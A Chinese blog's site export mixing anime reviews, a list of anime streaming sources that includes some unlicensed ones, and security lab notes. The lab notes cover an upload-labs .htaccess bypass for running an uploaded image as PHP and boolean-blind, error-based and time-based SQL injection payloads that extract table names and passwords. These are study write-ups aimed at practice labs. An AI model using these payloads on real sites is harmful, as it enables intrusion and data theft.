<li>相较于bilibili港澳台大部分画质更佳</li>
<li>很多时候op，ed歌词都有翻译<br>缺点：</li>
<li>会员费较贵</li>
<li>弹幕素质较低，需要自设屏蔽词，比较麻烦</li>
<li>有时字幕过大，略影响观看</li>
<li>老番资源较少</li>
</ul>
<p>使用方式：<br>手机端：设置台湾地区代理，下载动画疯app<br>电脑端：设置台湾地区代理，打开动画疯网址<br>会员价：36刀&#x2F;年。新年买半年或一年可以加送1个月<br><a href="https://ani.gamer.com.tw/">动画疯</a></p>
<ol start="3">
<li><strong>Netflix</strong><br>优点：</li>
</ol>
<ul>
<li>画质好，没得说</li>
<li>资源也比较多</li>
<li>有自制动画。如：恶魔人，赛博朋克</li>
<li>可以跳过op和ed<br>缺点：</li>
<li>新番资源少</li>
<li>对代理的要求比较高</li>
</ul>
<p>使用方式：<br>手机端：设置代理，下载Netflix app<br>电脑端：设置代理，打开网页或下载UMP（UMP也需要代理）<br>(合租)会员价：27刀&#x2F;年。不同的店价格可能不同<br><a href="https://www.netflix.com/">Netflix</a></p>
<ol start="4">
<li><strong>Disney+</strong><br>优点：<br>画质高<br>缺点：<br>资源少<br>新番不能及时更新</li>
</ol>
<p>观看方式：<br>手机端：购买会员，下载app<br>电脑端：购买会员，打开网站<br>(合租)会员价：13刀&#x2F;年。不同的店价格可能不同<br><a href="https://www.disneyplus.com/">Disney+</a></p>
<ol start="5">
<li><strong>Yahoo TV</strong><br>优点：<br>免费的1080p新番木棉花资源<br>缺点：<br>资源少<br>只有台湾地区有</li>
</ol>
<p>观看方式：<br>电脑端：代理至台湾，打开网站<br>手机端：本人未成功过<br><a href="https://tw.tv.yahoo.com/">YahooTV</a></p>
<ol start="6">
<li><strong>YouTube</strong></li>
</ol>
<ul>
<li>Ani-One 频道(最好在Singapore)<br>优点：<br>免费的1080p资源<br>有评论区<br>缺点：<br>资源少<br>少部分要频道会员</li>
</ul>
<p>观看方式：<br>手机端：打开YouTube，搜索该频道<br>电脑端：同上</p>
<p>还没有看过<strong>神之动画</strong>的快来看！</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/2C7Kp0yBpvo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

<p><a href="https://www.youtube.com/c/AniOneAsia">Ani-One频道</a></p>
<ul>
<li>木棉花 频道(最好在Taiwan)<br>优点：<br>免费的720p资源，直播时可有1080p<br>有评论区，直播时有实时评论<br>缺点：<br>资源少</li>
</ul>
<p>观看方式：<br>手机端：打开YouTube，搜索该频道<br>电脑端：同上<br><a href="https://www.youtube.com/c/AniOneAsia">木棉花台湾</a></p>
<ol start="7">
<li><strong>AcFun</strong><br>优点：<br>免费的1080p资源<br>有b站没有的资源（如物语系列，摇曳露营）<br>有评论区和弹幕<br>缺点：<br>资源少</li>
</ol>
<p>观看方式：<br>手机端：下载app即可<br>电脑端：打开网站即可<br><a href="https://www.acfun.cn/">AcFun</a></p>
<ol start="8">
<li><strong>mewatch</strong><br>优点：<br>免费的1080p资源<br>缺点：<br>资源数较少</li>
</ol>
<p>观看方式：<br>电脑端：换到新加坡代理，打开网站即可<br><a href="https://www.mewatch.sg/series/anime">mewatch</a></p>
<h2 id="非正版资源"><a href="#非正版资源" class="headerlink" title="非正版资源"></a>非正版资源</h2><ol>
<li><strong>Telegram</strong></li>
</ol>
<ul>
<li>NEP.Anime 频道<br>优点：<br>免费观看以及下载<br>收录了几乎从2018年末到现在的大部分资源<br>有小众资源<br>缺点：<br>2018年以前的资源很少</li>
</ul>
<p><a href="https://t.me/AnimeNep">NEP.Anime</a></p>
<ul>
<li>NC.Raws 频道<br>优点：<br>免费观看以及下载<br>新番一般时间延迟在10分钟内就有资源<br>资源质量偏高<br>有小众资源<br>缺点：<br>2021年以前的资源很少</li>
</ul>
<p><a href="https://t.me/NC_Raws_Channel">NC.Raws</a></p>
<ul>
<li>ANI 频道<br>优点：<br>免费观看以及下载<br>新番一般延迟在10分钟内就有资源<br>缺点：<br>需要下载观看，视网速快慢等待时间</li>
</ul>
<p><a href="https://t.me/channel_ani">ANI</a></p>
<p>观看方式：<br>手机端：下载Telegram，并搜索频道<br>电脑端：同上</p>
<ol start="2">
<li><strong>Age网站</strong><br>优点：<br>资源比较多<br>站内有分类，有人气排名<br>缺点：<br>画质不一定好<br>有广告</li>
</ol>
<p>观看方式：<br>手机端：下载app即可<br>电脑端：打开网站即可</p>
<p><a href="https://www.agemys.net/">AGE</a></p>
<ol start="3">
<li><strong>bt网站</strong><br>优点：<br>资源多<br>画质有的很好<br>缺点：<br>需要媒介下载后才能观看（比如迅雷，bit彗星），视情况等待时间较长</li>
</ol>
<p><a href="https://btbtt16.com/forum-index-fid-981-page-1.htm">BT动漫</a><br><a href="https://dongmanhuayuan.myheartsite.com/">动漫花园资源网</a></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>虽然使用非正版资源有时比正版资源还好，但我个人还是建议有足够经济能力的人至少为一个正版平台付费吧，也算是为动画行业添砖加瓦。尽管只有绵薄之力，本人也是在两个平台上付了年费的。<br>会为网络设置代理很重要，不仅是大陆地区。因为有些平台的资源是限制了在某个地区的。<br>有些平台并没有每个地区都尝试过，如果某个地区没有想要的资源请更换地区。(代理一般选择<strong>新加坡，台湾，香港，马来西亚</strong>)<br>注意本文的时效性：2022.11，后续有任何改变并不知晓。</p>
]]></content>
      <categories>
        <category>动画</category>
        <category>资源</category>
      </categories>
      <tags>
        <tag>动画</tag>
        <tag>资源</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_4</title>
    <url>/2022/11/24/upload-labs_4/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>改变能够改变的，选择能够选择的。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试<br>通过查看源码，我们可以发现，后缀名绕过已经行不通，因此我们需要更换思路。<br>可以尝试用.htaccess绕过。这里涉及到了.htaccess的知识。<br>‘.htaccess’文件相当于一种部分配置文件，好比局部变量一样，只在当前目录生效。比如你设置解析’.txt’解析为’.php’，那么’.htaccess’文件在的子目录中就会执行，而上一级目录不执行。<br>因此可以把目标文件后缀名改为.png，改Apache配置文件httpd.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AllowOverride All</span><br><span class="line"></span><br><span class="line">LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so</span><br></pre></td></tr></table></figure>
<p>在该目录下创建.htaccess文件，然后写入如下代码，使得解析时将.jpg解析为.php格式。</p>
<figure class="highlight h"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;b.jpg&quot;</span>&gt;                      <span class="comment">//如果匹配到名为 b.jpg 的文件 就执行该文件</span></span><br><span class="line">       SetHandler  application/x-httpd-php             <span class="comment">//把文件当成php的代码来解析</span></span><br><span class="line">&lt;/FilesMatch&gt;       </span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>上传并尝试执行<br>上传成功，之后蚁剑连接失败。<br>是phpstudy集成环境中 php 的问题<br>因为在小皮面板中php版本是nts意思是即非线程安全，不提供数据访问保护，不支持使用 .htaccess</p>
</li>
</ol>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>布尔盲注</title>
    <url>/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于布尔的盲注是一种常用的，重要的注入方式。</p>
<span id="more"></span>

<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时即可用此方式。</p>
<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="length-函数"><a href="#length-函数" class="headerlink" title="length()函数"></a>length()函数</h2><p>作用：返回字符串str的长度，以字节为单位。<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>

<h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h2><p>作用：从特定位置开始的字符串返回一个给定长度的子字符串<br>用法：<br>substr(str,pos,len)<br>str: 代表待截取的字符串<br>pos: 代表从什么位置开始截取<br>len: 表示字符串截取的长度<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and substr(database(),1,1)=&#x27;a&#x27;--+</span><br><span class="line">substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序</span><br><span class="line">这里的字母不区分大小写</span><br></pre></td></tr></table></figure>
<p>说明：与substr()函数作用相似的函数有mid()和substring()函数，其用法与substr()函数一致。<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substring(&#x27;hello&#x27;,1,1)和select mid(&#x27;hello&#x27;,1,1)</span><br><span class="line">都返回&#x27;h&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="ascii-函数"><a href="#ascii-函数" class="headerlink" title="ascii()函数"></a>ascii()函数</h2><p>作用：返回某个字符的ascii码值，ascii()函数只处理单个字符，若是字符串则会处理第一个字符。<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(&#x27;h&#x27;)=104 --+</span><br></pre></td></tr></table></figure>

<h2 id="ord-函数"><a href="#ord-函数" class="headerlink" title="ord()函数"></a>ord()函数</h2><p>作用：通常与substr()函数一起使用，用于返回字符的ascii码。<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
<p>说明：ASCII码表中可显示的字符范围是：0~127</p>
<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
<li><p>判断数据库名长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>
</li>
<li><p>猜解数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr(database(),2,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断数据库表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个表的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个表</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断数据库字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line"></span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个字段的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个字段</span><br></pre></td></tr></table></figure>
</li>
<li><p>取数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select 字段名 from 表名 limit 0,1),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure></li>
</ol>
<p>说明：如果写脚本，采用二分法更佳</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
<li><a href="https://blog.csdn.net/qq_35569814/article/details/100175886">SQL注入之布尔盲注</a></li>
<li><a href="https://wiki.wgpsec.org/knowledge/web/sql_injection.html">SQL注入漏洞基本原理</a></li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>布尔盲注</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>搖曳露营movie--仰望星空的童话</title>
    <url>/2022/11/14/%E6%90%96%E6%9B%B3%E9%9C%B2%E8%90%A5movie/</url>
    <content><![CDATA[<p><img src="/images/yuru4.png" alt="搖曳露营"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>未看电影前，零星评论让我以为会比较沉重的电影，欣赏过程中一直提心吊胆的，生怕发生点什么。但幸好，还是TV动画的味道，对于我这样一个单纯享受故事的<font color=Yellow>粉丝</font>而言，看完后很满足。<br>看的过程中，其实也感受到了<font color=orange>一点异样</font>，但为了保持良好的观影感受，我选择了忽略。既然要写影评，就应当把好的坏的都拿出来说。</p>
<p><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B6.png" alt="凛"></p>
<h1 id="坚守的延续"><a href="#坚守的延续" class="headerlink" title="坚守的延续"></a>坚守的延续</h1><p>虽说是电影，可其实和TV动画的差别并没有那么大。看过TV动画再来看电影的人，是熟悉的味道。<br>要说最大区别在哪里，那必然是长大了后的女孩们。通过电影一些细节猜测，设定在7-10年后，除了女孩们有所改变，其他人都是熟悉而无所变化的。当然，毕竟电影只有2小时，这些人的改变是完全不够篇幅的。<br><img src="/images/%E6%8A%9A%E5%AD%902.png" alt="抚子"><br><font color=blue>凛</font>成了挤电车的编辑部撰稿人，<font color=blue>抚子</font>是露营店的店员，<font color=blue>葵</font>是小学教师，<font color=blue>惠那</font>是宠物店的店员，<font color=blue>千明</font>在旅游振兴机构工作。<br>每个人的职业都相当的简单易懂。单论她们的职业，从她们每天过得情况来看，其实是相当理想的吧。不过还是能从中看出社会人的一些心酸，比如凛加班啊，葵所在的学校拆掉了啊，千明从东京辞职啊之类的。我们可以看出，制作组对于本动画是极力想要维持TV动画的氛围，因此而舍弃了社会上阴暗沉重的部分，转而把重心维持在美好的一面。可以看出，电影是面向粉丝以及想要轻松观看的人群。也就是说，其实受到了前作限制，不能发挥出更具自我的风格。<font color=SeaGreen>电影内的女孩们的现实约束少了，可电影外的制作组约束却多了。</font><br><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B5.png" alt="搖曳露营"><br>对于不同立场的人，评价也就自然不同了，单论粉丝，我想是相对满意的。对于社会人，可能因为没有表达出他们在社会的心酸而没那么满意。站在一个更高的台阶上看，是能做到更深刻却没做到，造成了部分人的失望。<br><font color=SeaGreen>但无论如何，对于一般人，这部电影也是值得看一遍的，仅一遍。当然，粉丝另论。</font></p>
<p><img src="/images/%E5%87%9B+%E6%8A%9A%E5%AD%907.png" alt="凛和抚子"></p>
<h1 id="后劲不足"><a href="#后劲不足" class="headerlink" title="后劲不足"></a>后劲不足</h1><p><font color=red>电影提出了一个很有意思的话题，传承</font>。是抚子和凛在泡温泉的时候提出来的。这就从第一季的自然享受，第二季的人文情怀，拔升到了电影的露营传承。正因为想要和别人分享这种露营的乐趣，所以建立了这个露营场。虽然电影里没有多少实际的完整露营，但依然是搖曳露营的精神在参与。让她们传递乐趣给别人的根本原因，在于对露营的热爱。而每个人，都应有自己所热爱的事物，也就能明白露营女孩们为何能热情参与建立露营场。我自身也对此颇有感触，热爱动画的我，又在多少个夜里，幻想能自己创立一家动画公司，幻想自己参与一部动画的制作…<br><img src="/images/yuru3.png" alt="搖曳露营"><br>电影的现实上，是很让人匪夷所思的。明明凛单程就需要4小时，她们又都不在同一个地方，却让人感觉随时都有时间一起待在露营场，搭建过程中也从未遇到大的挫折。<font color=SlateGray>不由得让人觉得，是不是有些童话了呢？</font>又或许，制作组本意就是做出成人的童话？这样一来，就感受到了电影水平上升受到了限制，有种流于表面的感觉。多一些遭遇困难，面对困境的细节，我想会更棒吧。<br><img src="/images/%E7%8A%AC%E5%B1%B1%E8%91%B52.png" alt="搖曳露营"><br>老实说，结构非常地普通，从欢乐到哀伤再到欢乐，有些地方有点刻意，很遗憾没有发挥出作为电影的特点。<br><font color=Fuchsia>总而言之，电影是佳作，TV动画是神作。</font></p>
]]></content>
      <categories>
        <category>动画</category>
        <category>搖曳露营</category>
      </categories>
      <tags>
        <tag>动画</tag>
        <tag>搖曳露营</tag>
      </tags>
  </entry>
  <entry>
    <title>报错注入常用函数</title>
    <url>/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所谓报错注入，就是SQL注入中页面不会返回正常信息，但是会返回报错信息而产生的一种注入方式。而报错注入在使用函数时会很方便，这里就来介绍三种常用报错函数。</p>
<span id="more"></span>

<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><ol>
<li>格式<br>updatexml(XML_document,XPath_string,new_value)</li>
</ol>
<ul>
<li>XML_document: xml标记</li>
<li>XPath_string: 显示输入语句</li>
<li>new_value: 新值</li>
<li>输出字符长度限制为32个字符</li>
<li>适用版本：5.1.5以上</li>
</ul>
<ol start="2">
<li>原理<br>updatexml()函数是MySQL对XML文档数据进行查询和修改的XPATH函数：</li>
</ol>
<ul>
<li>xml:可扩展语言</li>
<li>update():函数更新</li>
<li>组合，具有查询功能的函数，用于查询xpath<br>利用插入不符合函数格式的语句并拼接查询语句从而通过函数报错达到查询内容的目的</li>
</ul>
<ol start="3">
<li>示例<br>updatexml(1,concat(0x7e,(select database()),0x7e),1)</li>
</ol>
<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><ol>
<li><p>格式<br>extractvalue(XML_document,XPath_string):<br>XML_document是string格式，为XML文档对象的名称<br>XPath_string(Xpath格式的字符串)<br>concat:返回结果为连接参数产生的字符串</p>
</li>
<li><p>原理</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#x27;</span>, <span class="string">&#x27;/a/b&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>该语句是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误，就会报错</p>
</li>
</ol>
<ul>
<li>输出字符长度限制为32个字符</li>
<li>适用版本：5.1.5以上</li>
</ul>
<ol start="3">
<li>示例<br>extractvalue(1,concat(0x7e,(select database())))</li>
</ol>
<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><ol>
<li>格式<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(payload,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>payload是需要插入sql注入语句的位置</li>
<li>floor():去除小数部分</li>
<li>rand():产生随机数</li>
<li>rand(x):每个x对应一个固定的值，连续执行多次值会变化，但可预测，序列为011011…</li>
<li>count():count(*)函数返回表中的记录数</li>
<li>适用版本：5.0 &lt; MySQL &lt; 8.x</li>
</ul>
<ol start="2">
<li><p>原理<br>利用数据库表主键不能重复的原理，使用group by分组，产生主键key冗余，导致报错<br>详细解释：<a href="https://blog.csdn.net/qq_43504939/article/details/90046342">SQL注入:floor()报错注入</a></p>
</li>
<li><p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1’ and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
<li><p><a href="https://blog.csdn.net/qq_43238111/article/details/106205125">报错注入常用函数</a></p>
</li>
<li><p><a href="https://www.cnblogs.com/GTL-JU/p/16054806.html">报错注入常用的三种注入方式</a></p>
</li>
<li><p><a href="https://blog.csdn.net/weixin_46706771/article/details/112768348">MYSQL 通过ExtractValue()报错注入</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>报错注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>时间盲注</title>
    <url>/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通过时间函数使SQL语句执行时间延长，从页面响应时间判断条件是否正确的一种注入方式。建议有不明白的地方可以先看看<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>。</p>
<span id="more"></span>

<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时，甚至没有对错返回时，即可用此方式。</p>
<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="sleep-second-函数"><a href="#sleep-second-函数" class="headerlink" title="sleep(second)函数"></a>sleep(second)函数</h2><p>延迟函数<br>作用：延迟second的时间<br>示例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>

<h2 id="benchmark-count-expr-函数"><a href="#benchmark-count-expr-函数" class="headerlink" title="benchmark(count,expr)函数"></a>benchmark(count,expr)函数</h2><p>作用：可测试某些特定操作的执行速度<br>count：执行次数<br>expr：表达式,表示重复计算表达式count次，评估执行表达式的效率<br>expr表达式必须返回单个值，不允许返回多行记录或多列值，因此只能查询一个字段，且返回值只有1个，才适用于这个函数。<br>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> benchmark(<span class="number">100</span>,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
<li><p>判断数据库名长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>猜解数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断数据库表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断数据库字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))))&gt;100,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>取数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and  if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  </span><br></pre></td></tr></table></figure></li>
</ol>
<p>说明：建议写脚本，脚本有机会以后添加</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
<li><a href="https://blog.csdn.net/qq_43431158/article/details/97496092">sql注入学习——时间盲注</a></li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>时间盲注</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>赛博朋克~边缘行者--渺小个人的癫狂悲剧</title>
    <url>/2022/11/19/%E8%B5%9B%E5%8D%9A%E6%9C%8B%E5%85%8B%E5%8A%A8%E7%94%BB/</url>
    <content><![CDATA[<p><img src="/images/Cyberpunk.png" alt="Cyberpunk"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Nexflix上九月份一口气播完的，我是等了一段时间，等风评落地才来看的。<br>虽说如此，这部仅有10集的动画我也看了一个月左右。终于今天把最后三集看完了。<br>知道这款游戏，但我没玩也没了解，一无所知没有被剧透来看这部动画，真是一种享受~</p>
<p><img src="/images/Lucy&David2.png" alt="Lucy&amp;David"></p>
<h1 id="色彩"><a href="#色彩" class="headerlink" title="色彩"></a>色彩</h1><p>先来聊聊这个吧，毕竟是能给人最直观感受的方式。<br><font color=Crimson>非常符合我心中对于赛博朋克世界的想象，单凭画面就能让我感受到那股<strong>荒诞离奇</strong>了。对于少有看日本动画的人而言，恐怕很轻易以为这是美国制作的动画吧。不仅如此，这样的画风还带来一个非常有利于动画剧情的好处，对于这样一个动作少不了的动画而言，这样的画风能够提供<strong>足够的张力</strong>。</font>可惜身边只有笔记本这样的小屏幕，如果有够大的屏幕，一定能完美地感受到动画洋溢出来的力量。</p>
<p><img src="/images/Lucy3.png" alt="Lucy"></p>
<h1 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h1><p>或许因为该游戏制作团队是欧美人，同时游戏设定在美国，动画投资者是Netflix，本作的音乐的确是更为偏向于欧美的风格。<font color=Darkorange>op的氛围倾向于<strong>毁灭</strong>，而ed则是一种<strong>悲剧</strong>的感觉。总之，音乐方面给足了暗示吧。如果说，片头片尾的音乐是符合整部动画气氛，那么最后一集的插曲，就是<strong>侧耳动听之余给人带来无限的悲伤</strong>吧。</font>当然，还有其它插曲，也很符合动画气氛，这里不再一一提起。<br>片头曲：This Fffire<br>片尾曲：Let You Down<br>动画插曲：I Really Want to Stay at Your House</p>
<p><img src="/images/kiss.png" alt="kiss"></p>
<h1 id="剧情"><a href="#剧情" class="headerlink" title="剧情"></a>剧情</h1><p><font color=DarkViolet>相较于传统日本动画，这一部动画仅有10集，这也造就了剧情异常紧凑，恰到好处地略去了那些不用解释观众也能自行领会的部分，各个转场不说浑然天成，也是毫无突兀感。从一开始较快的节奏，作了一点铺垫。慢慢地，剧情一点点加速，再也无法分出一点精力去注意外界杂讯。<strong>精彩绝伦</strong>谓之毫不为过。</font><br><font color=DarkRed>这绝不是好莱坞式爆米花电影，无论是画面音乐还是剧情，都堪称<strong>一流水准</strong>。倘如只是抱着轻松娱乐的心态来看这部动画，也并非不行，但我想恐怕只能收获肤浅简单的想法吧。面对这样一部一年或许仅有一部的短小精悍的动画佳作，岂不是太可惜了吗？</font></p>
<p><img src="/images/Lucy8.png" alt="Lucy"></p>
<h1 id="人物"><a href="#人物" class="headerlink" title="人物"></a>人物</h1><p>各个人物的塑造都十分生动形象，可见制作功底的有力。<br><font color=Magenta>若要问我哪个人物最喜欢，那无疑是<strong>丽贝卡(Rebecca)</strong>，萝莉身材，豪爽作风，平时个性嘻嘻哈哈疯疯癫癫，关键时刻可靠队友毫不含糊。喜欢着大卫(David)，却不因大卫喜欢露西(Lucy)而吃醋，处处关心与照顾大卫，是大卫唯一能托付的人。也因此，最后亚当重锤从天而降将丽贝卡杀害的时候我直接气得锤了桌子一下。老难受了啊！！！一直提心吊胆到最后，结果还是被杀了。亚当重锤，我要杀你一万次也不够！！！</font></p>
<p><img src="/images/Rebecca2.png" alt="Rebecca"></p>
<h1 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h1><font color=orange>
无疑，这是一个极度资本化的世界，只要有钱，服务应有尽有。公安这些在资本面前不值一提，大公司的军事力量甚至能匹敌军队。大卫舍生去对抗公司，连公司的高层都无法触及。这部动画也能给未来的人带来一些警示吧。人的性命化为草芥，没有人在意。当沉浸于动画的时候，没有感觉到。当动画结束后，冷静下来，会发现，这部动画对于生命的处理如此简单以至于不会有人在看动画时缅怀逝去的生命，如大卫的母亲，丽贝卡的哥哥，曼恩(Marine)...或许有人认为是由于动画时长的因素，我想有这方面的因素，但有一个更重要的因素是，让人切身体会到夜之城的生命之轻，人的性命不值一提。
